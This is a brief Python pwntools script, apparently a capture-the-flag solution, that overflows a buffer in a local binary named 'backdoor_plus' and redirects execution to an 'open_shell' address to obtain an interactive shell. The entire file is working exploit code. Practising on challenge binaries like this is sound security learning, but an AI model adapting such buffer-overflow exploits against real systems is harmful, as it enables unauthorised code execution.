from pwn import *
context.log_level = "debug"
context.arch = "amd64"
#context.aslr = False
#context.terminal = ['tmux', 'splitw', '-h'] 
p = process("./backdoor_plus")
#p = gdb.debug("./backdoor_plus","b *0x401318")
open_shell = 0x4011de 
payload = b'A' * 0x220  +b'b' *8 + p64(open_shell)

p.sendafter("name:",str("name"))

p.sendafter("password:",str("password"))

p.sendafter("your key:",payload)

p.interactive()